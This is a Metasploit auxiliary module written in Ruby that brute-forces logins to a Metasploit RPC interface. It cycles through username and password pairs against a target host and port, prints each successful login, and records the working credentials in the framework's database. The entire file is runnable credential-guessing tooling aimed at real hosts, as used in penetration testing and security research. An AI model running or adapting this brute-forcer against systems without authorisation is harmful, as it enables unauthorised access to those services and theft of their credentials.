##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary

  include Msf::Auxiliary::Report
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name'          => 'Metasploit RPC Interface Login Utility',
      'Description'   => %q{
        This module simply attempts to login to a
        Metasploit RPC interface using a specific
        user/pass.
      },
      'Author'         => [ 'Vlatko Kosturjak <kost[at]linux.hr>' ],
      'License'        => MSF_LICENSE
    )

    register_options(
      [
        Opt::RPORT(55553),
        OptString.new('USERNAME', [true, "A specific username to authenticate as. Default is msf", "msf"]),
        OptBool.new('BLANK_PASSWORDS', [false, "Try blank passwords for all users", false]),
        OptBool.new('SSL', [ true, "Negotiate SSL for outgoing connections", true])
      ])
    register_autofilter_ports([3790])

  end

  @@loaded_msfrpc = false
  begin
    require 'msf/core/rpc/v10/client'
    @@loaded_msfrpc = true
  rescue LoadError
  end

  def run_host(ip)

    unless @@loaded_msfrpc
      print_error("You don't have 'msgpack', please install that gem manually.")
      return
    end

    begin
      @rpc = Msf::RPC::Client.new(
        :host => datastore['RHOST'],
        :port => datastore['RPORT'],
        :ssl  => datastore['SSL']
      )
    rescue ::Interrupt
      raise $!
    rescue ::Exception => e
      vprint_error("#{datastore['SSL'].to_s} Cannot create RPC client : #{e.to_s}")
      return
    end

    each_user_pass do |user, pass|
      do_login(user, pass)
    end
  end

  def report_cred(opts)
    service_data = {
      address: opts[:ip],
      port: opts[:port],
      service_name: opts[:service_name],
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      username: opts[:user],
      private_data: opts[:password],
      private_type: :password
    }.merge(service_data)

    login_data = {
      last_attempted_at: Time.now,
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::SUCCESSFUL,
      proof: opts[:proof]
    }.merge(service_data)

    create_credential_login(login_data)
  end

  def do_login(user='msf', pass='msf')
    vprint_status("Trying username:'#{user}' with password:'#{pass}'")
    begin
      res = @rpc.login(user, pass)
      if res
        print_good("SUCCESSFUL LOGIN. '#{user}' : '#{pass}'")
        report_cred(
          ip: datastore['RHOST'],
          port: datastore['RPORT'],
          service_name: 'msf-rpc',
          user: user,
          password: pass,
          proof: res.body
        )
        @rpc.close
        return :next_user
      end
    rescue  => e
      vprint_status("#{datastore['SSL'].to_s} - Bad login")
      @rpc.close
      return :skip_pass
    end
  end
end
